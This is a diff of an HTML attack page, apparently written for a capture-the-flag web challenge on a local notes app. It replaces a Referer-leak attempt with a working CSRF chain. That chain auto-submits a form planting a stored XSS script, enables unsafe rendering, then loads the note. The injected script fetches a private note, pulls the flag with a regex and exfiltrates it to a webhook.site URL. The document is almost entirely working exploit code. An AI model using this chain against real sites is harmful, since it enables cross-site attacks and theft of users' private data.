@@ -1,18 +1,41 @@
+<!doctype html>
 <html>
-  <head>
-    <!-- STEP 1: Enable Unsafe Mode for note ID=1 (CSRF) -->
-    <meta http-equiv="refresh" content="0; url=http://127.0.0.1:7189/prefs/unsafe?id=1&enable=1" />
-  </head>
-  <body>
-    <!-- STEP 2: After 2 seconds, load the note and leak the flag via Referer -->
-    <script>
-      setTimeout(() => {
-        // Redirect to the note (flag will be in Referer)
-        window.location = "http://127.0.0.1:7189/notes/1";
-      }, 2000);
-    </script>
-    
-    <!-- Fallback: If JS is blocked, use an image to force Referer leakage -->
-    <img src="https://webhook.site/d1b4da46-4ad8-4ec4-8241-bcdbcefd6aa0?leak=1" style="display:none;" />
-  </body>
+<body>
+  <!-- 1) Create note #2 with our XSS payload -->
+  <form id="mk" action="http://127.0.0.1:7189/dashboard" method="POST">
+    <input type="hidden" name="content" value='
+      <script>
+      (async ()=>{
+        // grab the HTML of the flag note
+        const res  = await fetch("/notes/1");
+        const html = await res.text();
+
+        // try to extract the flag; if regex fails, send entire HTML for debugging
+        const m = /UMC\w*\{[^}]+\}/.exec(html);
+        const flag = m ? m[0] : html;
+
+        // exfil to webhook.site
+        new Image().src = "https://webhook.site/d1b4da46-4ad8-4ec4-8241-bcdbcefd6aa0?flag=" 
+                          + encodeURIComponent(flag);
+      })();
+      </script>
+    '>
+  </form>
+
+  <!-- 2) Turn on unsafe rendering for note #2 -->
+  <form id="us" action="http://127.0.0.1:7189/prefs/unsafe" method="POST">
+    <input type="hidden" name="id"    value="2">
+    <input type="hidden" name="enable" value="1">
+  </form>
+
+  <script>
+    // kick it off: 
+    //  - immediately POST /dashboard
+    //  - after 2 s, POST /prefs/unsafe
+    //  - after 4 s, GET /notes/2 (where our XSS lives)
+    document.getElementById("mk").submit();
+    setTimeout(()=> document.getElementById("us").submit(),        2000);
+    setTimeout(()=> location.href = "http://127.0.0.1:7189/notes/2", 4000);
+  </script>
+</body>
 </html>
